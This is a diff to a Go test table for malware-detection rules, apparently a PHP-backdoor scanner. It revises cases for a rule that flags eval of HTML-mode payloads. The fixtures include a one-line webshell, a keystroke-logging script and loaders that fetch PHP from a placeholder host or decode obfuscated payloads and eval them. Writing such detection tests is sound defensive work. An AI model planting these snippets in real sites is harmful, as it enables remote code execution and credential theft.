@@ -267,38 +267,10 @@ system($_GET['cmd']);`,
 			sample: `document.addEventListener('keypress',function(e){` +
 				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
 		},
-		// backdoor_htmlmode_eval. The remote-URL branch is deliberately a
-		// proximity test, not a data-flow one: RE2 and YARA-X have no
-		// backreferences, so the eval'd variable cannot be bound to the fetched
-		// one, and a list of likely payload variable names would go blind the
-		// moment the attacker renames the variable. Known limitation: a file that
-		// holds a literal URL and, within the same window, evaluates a locally
-		// read template will match. No such file exists among the 84 carrying the
-		// idiom on a production host, but the shape is possible.
-		{
-			name: "remote helper feeding HTML-mode eval",
-			rule: "backdoor_htmlmode_eval",
-			want: true,
-			sample: `<?php
-function fetchContent($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $content = curl_exec($ch);
-    return $content;
-}
-$url = 'https://payload.example.test/raw.php';
-$content = fetchContent($url);
-if ($content !== false) { eval('?>' . $content); }`,
-		},
-		{
-			name: "direct remote read feeding HTML-mode eval",
-			rule: "backdoor_htmlmode_eval",
-			want: true,
-			sample: `<?php
-$payload = file_get_contents('https://payload.example.test/stage.php');
-eval('?>' . $payload);`,
-		},
+		// backdoor_htmlmode_eval keys on the payload being rebuilt at runtime,
+		// not on the payload variable name (renamed for free) and not on a nearby
+		// literal URL (split across a concatenation for free). Both engines must
+		// agree on every one of these.
 		{
 			name: "payload rebuilt through an indirect call",
 			rule: "backdoor_htmlmode_eval",
@@ -311,6 +283,18 @@ class SMTP {
 }`,
 		},
 		{
+			name:   "payload rebuilt through stacked decoders",
+			rule:   "backdoor_htmlmode_eval",
+			want:   true,
+			sample: `<?php eval('?>' . gzinflate(base64_decode($x)));`,
+		},
+		{
+			name:   "payload rebuilt through a variable function",
+			rule:   "backdoor_htmlmode_eval",
+			want:   true,
+			sample: `<?php eval('?>' . $decoder($p));`,
+		},
+		{
 			name: "Twig-style local template evaluator",
 			rule: "backdoor_htmlmode_eval",
 			sample: `<?php
@@ -318,28 +302,18 @@ final class Environment {
     public function render($name, array $context = [])
     {
         $source = $this->getLoader()->getSourceContext($name)->getCode();
-        return eval('?>' . $this->compileSource($source));
+        return eval('?>' . $source);
     }
 }`,
 		},
 		{
-			name: "docblock URL far from the eval",
+			name: "remote fetch beside a local template evaluator",
 			rule: "backdoor_htmlmode_eval",
 			sample: `<?php
-/**
- * @see https://twig.symfony.com/doc/3.x/api.html
- */
-class Compiler {
-    private $notes = '` + strings.Repeat("a", 600) + `';
-    public function render($tpl) {
-        return eval('?>' . $tpl);
-    }
-}`,
-		},
-		{
-			name:   "HTML-mode eval without network source",
-			rule:   "backdoor_htmlmode_eval",
-			sample: `<?php $content = load_local_template(); eval('?>' . $content);`,
+$url = 'https://api.example.test/data';
+$response = curl_exec($client);
+$template = file_get_contents(__DIR__ . '/views/page.tpl');
+eval('?>' . $template);`,
 		},
 		{
 			name:   "remote fetch without HTML-mode eval",
